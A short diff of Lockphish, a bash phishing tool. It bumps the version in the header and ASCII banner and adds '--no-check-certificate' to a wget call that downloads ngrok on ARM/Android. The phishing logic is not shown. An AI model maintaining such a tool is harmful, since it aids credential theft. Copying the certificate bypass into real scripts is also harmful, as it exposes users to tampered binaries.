@@ -1,5 +1,5 @@
 #!/bin/bash
-# Lockphish v1.0
+# Lockphish v1.1
 # Coded by: github.com/thelinuxchoice/lockphish
 # Twitter: @linux_choice
 # Read the License before using any part from this code.
@@ -14,7 +14,7 @@ printf "\e[1;33m   / /  ___   ___| | __\e[0m\e[1;77m_ __ | |__ (_)___| |__   \e[
 printf "\e[1;33m  / /  / _ \ / __| |/ /\e[0m\e[1;77m '_ \| '_ \| / __| '_ \  \e[0m\n"
 printf "\e[1;33m / /__| (_) | (__|   <|\e[0m\e[1;77m |_) | | | | \__ \ | | | \e[0m\n"
 printf "\e[1;33m \____/\___/ \___|_|\_\ \e[0m\e[1;77m.__/|_| |_|_|___/_| |_|\e[0m\n"
-printf "\e[1;77m                      |_|                  \e[0m\e[1;33mv1.0\e[0m\n"
+printf "\e[1;77m                      |_|                  \e[0m\e[1;33mv1.1\e[0m\n"
 
 printf " \n\e[1;77m coded by: github.com/thelinuxchoice/lockphish\e[0m \n"
 printf " \e[1;77mtwitter: @linux_choice\e[1;77m\e[0m"
@@ -188,7 +188,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
 if [[ -e ngrok-stable-linux-arm.zip ]]; then
 unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
